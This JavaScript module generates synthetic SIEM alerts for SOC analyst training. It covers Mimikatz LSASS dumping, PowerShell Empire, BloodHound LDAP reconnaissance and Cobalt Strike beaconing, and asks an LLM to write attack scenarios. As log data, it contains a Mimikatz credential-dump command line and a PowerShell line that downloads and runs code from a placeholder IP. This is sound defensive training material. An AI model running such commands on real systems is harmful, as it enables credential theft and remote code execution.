
import { InvokeLLM } from "@/integrations/Core";

// High-Fidelity SIEM Log Generation Engine
// Generates realistic, detailed logs matching the provided JSON structure.

// --- CORE UTILITIES ---
const simpleUUID = () => `evt-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;

const generateTimestamp = (base, offsetSeconds) => {
    return new Date(base.getTime() + offsetSeconds * 1000).toISOString();
};

const AGENT_POOL = [
    { ip: "10.10.5.20", name: "backup-server.corp.local", id: "agent-edr-020" },
    { ip: "10.10.10.15", name: "workstation-hr-01.corp.local", id: "agent-edr-035" },
    { ip: "10.1.2.100", name: "domain-controller-01.corp.local", id: "agent-edr-001" },
    { ip: "192.168.1.55", name: "dev-machine-jdoe.dev.local", id: "agent-edr-112" },
];

const MANAGER_POOL = [
    { name: "carbon-black-edr" },
    { name: "wazuh-manager" },
    { name: "crowdstrike-falcon" },
    { name: "sentinel-one" }
];

// --- LOG TEMPLATE BUILDER ---
const createSIEMLog = (params) => {
    const {
        agent, manager, rule, data, location, decoder, timestamp, customIndex
    } = params;
    
    const indexName = customIndex || rule.groups[0] || "generic";
    const date = new Date(timestamp);
    const index = `${indexName}-${date.getFullYear()}.${String(date.getMonth() + 1).padStart(2, '0')}`;

    return {
        _index: index,
        _id: simpleUUID(),
        _source: {
            input: { type: 'process' },
            agent,
            manager,
            data,
            rule,
            location,
            decoder,
            timestamp,
        },
        // --- Add flattened fields for easier display ---
        id: simpleUUID(),
        rule_description: rule.description,
        source_type: manager.name,
        username: data?.win?.eventdata?.TargetUserName || data?.powershell?.script_block_text?.match(/User:\s*(\w+)/)?.[1] || 'SYSTEM',
        hostname: agent.name,
        ip_address: agent.ip,
        severity: rule.level,
        admin_notes: `AI Generated: ${rule.description}`,
        default_classification: rule.level === 'critical' || rule.level === 'high' ? 'True Positive' : 'Escalate to TIER 2',
        raw_log_data: { ...data }
    };
};

// --- SPECIFIC ATTACK TECHNIQUE GENERATORS ---

const generateMimikatzLog = (timestamp, agent, manager) => {
    return createSIEMLog({
        timestamp, agent, manager,
        customIndex: "mimikatz",
        decoder: { name: "behavioral_analytics" },
        location: "edr/credential_access/lsass_dump",
        rule: {
            mail: true,
            level: "critical",
            description: "Mimikatz-style credential harvesting detected - LSASS memory dumping with advanced evasion techniques.",
            groups: ["credential_access", "mimikatz", "lsass_dump"],
            firedtimes: "1",
            mitre: {
                technique: ["T1003.001"],
                id: ["TA0006"],
                tactic: ["Credential Access"]
            }
        },
        data: {
            win: {
                system: {
                    eventID: 4688,
                    providerName: "Microsoft-Windows-Security-Auditing"
                },
                eventdata: {
                    NewProcessName: "C:\\Windows\\Temp\\m.exe",
                    SubjectUserName: "svc_backup",
                    TargetUserName: "SYSTEM",
                    CommandLine: "C:\\Windows\\Temp\\m.exe \"sekurlsa::logonpasswords full\""
                },
                process: {
                    eventType: "credential_access",
                    processName: "lsass_dumper.exe",
                    processHash: "sha256:4585b220fd13925aff301e9ac234ea6edbd25848d437d2a107bc0173e6f9a0b9",
                    commandLine: "sekurlsa::logonPasswords full",
                    parentProcess: "explorer.exe",
                    targetProcess: "lsass.exe",
                    credentialsHarvested: {
                        domainUsers: Math.floor(Math.random() * 15) + 5,
                        serviceAccounts: Math.floor(Math.random() * 5) + 2,
                        adminAccounts: Math.floor(Math.random() * 2) + 1,
                        plaintextPasswords: Math.floor(Math.random() * 10),
                        ntlmHashes: Math.floor(Math.random() * 20) + 10
                    },
                    evasionTechniques: ["process_hollowing", "dll_injection"],
                }
            }
        }
    });
};

const generatePowershellEmpireLog = (timestamp, agent, manager) => {
    return createSIEMLog({
        timestamp, agent, manager,
        customIndex: "powershell",
        decoder: { name: "powershell" },
        location: "edr/execution/powershell",
        rule: {
            level: "high",
            description: "Suspicious PowerShell script block detected with obfuscation, indicative of PowerShell Empire.",
            groups: ["execution", "powershell", "obfuscation"],
            firedtimes: "1",
            mitre: {
                technique: ["T1059.001"],
                id: ["TA0002"],
                tactic: ["Execution"]
            }
        },
        data: {
            powershell: {
                script_block_id: `S-1-5-21-3624321398-${Math.floor(Math.random()*1000000000)}-500`,
                script_block_text: "IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.88/a')",
                obfuscation_layers: Math.floor(Math.random() * 3) + 1,
                suspicious_keywords: ["IEX", "DownloadString", "Net.WebClient"]
            }
        }
    });
};

const generateBloodHoundLog = (timestamp, agent, manager) => {
    return createSIEMLog({
        timestamp, agent, manager,
        customIndex: "activedirectory",
        decoder: { name: "activedirectory-audit" },
        location: "activedirectory/discovery/ldap_search",
        rule: {
            level: "medium",
            description: "Anomalous LDAP search activity detected, consistent with BloodHound reconnaissance.",
            groups: ["discovery", "reconnaissance", "bloodhound"],
            firedtimes: "1",
            mitre: {
                technique: ["T1087.002", "T1069.002"],
                id: ["TA0007"],
                tactic: ["Discovery"]
            }
        },
        data: {
            ldap: {
                bind_user: "workstation-hr-01$",
                search_filter: "(&(objectCategory=group)(adminCount=1))",
                search_scope: "Subtree",
                queries_per_minute: Math.floor(Math.random() * 200) + 150,
                attributes_queried: ["member", "adminCount", "primaryGroupID"]
            }
        }
    });
};

const generateCobaltStrikeLog = (timestamp, agent, manager) => {
    return createSIEMLog({
        timestamp, agent, manager,
        customIndex: "network",
        decoder: { name: "netflow" },
        location: "network/c2/beaconing",
        rule: {
            level: "high",
            description: "Periodic network beaconing detected to a known malicious C2 server, characteristic of Cobalt Strike.",
            groups: ["command_and_control", "c2", "cobalt_strike"],
            firedtimes: "1",
            mitre: {
                technique: ["T1071.001"],
                id: ["TA0011"],
                tactic: ["Command and Control"]
            }
        },
        data: {
            network: {
                destination_ip: "198.51.100.15",
                destination_port: 443,
                protocol: "TCP",
                bytes_out: Math.floor(Math.random() * 100) + 50,
                bytes_in: Math.floor(Math.random() * 500) + 200,
                interval_seconds: 60,
                jitter_percentage: Math.floor(Math.random() * 20) + 5,
                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
            }
        }
    });
};

// --- STORY-BASED SCENARIO ORCHESTRATOR ---
export const generateStoryBasedScenario = async () => {
    const prompt = `
Generate a complete, realistic cybersecurity training scenario for SOC analysts. The scenario should tell a cohesive story of an attack, from initial access to final impact.

**Instructions:**
1.  **Create a Scenario:** Invent a realistic company, an attacker persona, and an attack vector (e.g., phishing, vulnerability exploit).
2.  **Define Scenario Metadata:** Provide a title, detailed description, difficulty (Easy, Medium, Hard, Advanced), and a primary attack category.
3.  **Generate Log Events:** Create 4-8 realistic log events that represent key stages of the attack.
    -   **CRITICAL:** Each log event object **MUST** include a top-level \`"timestamp"\` field with a valid ISO 8601 date-time string.
    -   Each log event should have a unique ID, a source type (e.g., Firewall, EDR, AD), severity, and a clear description.
    -   Include raw log data that a SOC analyst would see.
    -   Provide internal admin notes explaining the event's significance and the expected analyst verdict.
4.  **Learning Objectives:** List 3-5 key learning objectives for the student.

**Output Schema:**
The final output must be a single JSON object matching this exact structure:
{
  "title": "string",
  "description": "string",
  "difficulty": "Easy|Medium|Hard|Advanced",
  "category": "Malware|Brute Force|Privilege Escalation|Data Exfiltration|etc.",
  "learning_objctives": ["string", "string", ...],
  "initial_events": [
    {
      "id": "string (unique identifier)",
      "rule_description": "string",
      "source_type": "string (e.g., EDR, Firewall)",
      "timestamp": "string (ISO 8601 format, e.g., 2024-08-20T10:00:00Z)",
      "username": "string (e.g., CORP\\\\attacker)",
      "hostname": "string (e.g., WEB-SERVER-01)",
      "ip_address": "string",
      "severity": "Low|Medium|High|Critical",
      "notes": "string (explanation for the student)",
      "admin_notes": "string (internal notes on verdict/reasoning)",
      "raw_log_data": { "key": "value", ... },
      "default_classification": "True Positive|False Positive|Escalate to TIER 2"
    },
    ...
  ]
}
`;

    try {
        // InvokeLLM is assumed to be available in the execution environment.
        const response = await InvokeLLM({
            prompt: prompt,
            response_json_schema: {
                type: "object",
                properties: {
                    title: { type: "string" },
                    description: { type: "string" },
                    difficulty: { type: "string", enum: ["Easy", "Medium", "Hard", "Advanced"] },
                    category: { type: "string", enum: ["Malware", "Brute Force", "Privilege Escalation", "Data Exfiltration", "Network Intrusion", "Insider Threat", "Phishing / Social Engineering", "Web Application Attack", "Denial of Service (DoS/DDoS)", "Supply Chain Attack", "Cloud Misconfiguration", "Vulnerability Exploitation"] },
                    learning_objectives: { type: "array", items: { type: "string" } },
                    initial_events: {
                        type: "array",
                        items: {
                            type: "object",
                            properties: {
                                id: { type: "string" },
                                rule_description: { type: "string" },
                                source_type: { type: "string" },
                                timestamp: { type: "string", format: "date-time" },
                                username: { type: "string" },
                                hostname: { type: "string" },
                                ip_address: { type: "string" },
                                severity: { type: "string", enum: ["Low", "Medium", "High", "Critical"] },
                                notes: { type: "string" },
                                admin_notes: { type: "string" },
                                raw_log_data: { type: "object" },
                                default_classification: { type: "string", enum: ["True Positive", "False Positive", "Escalate to TIER 2"] }
                            },
                            required: ["id", "rule_description", "source_type", "timestamp", "severity", "raw_log_data", "default_classification"]
                        }
                    }
                },
                required: ["title", "description", "difficulty", "category", "initial_events"]
            },
        });

        // Ensure every event has a valid timestamp, just in case the AI misses one.
        if (response && response.initial_events) {
            response.initial_events.forEach(event => {
                if (!event.timestamp) {
                    console.warn('AI generated an event without a timestamp. Adding a fallback timestamp.');
                    event.timestamp = new Date().toISOString();
                }
            });
        }
        
        return response;
    } catch (error) {
        console.error("Error generating story-based scenario:", error);
        throw new Error("Failed to generate scenario with AI. Please check the logs.");
    }
};
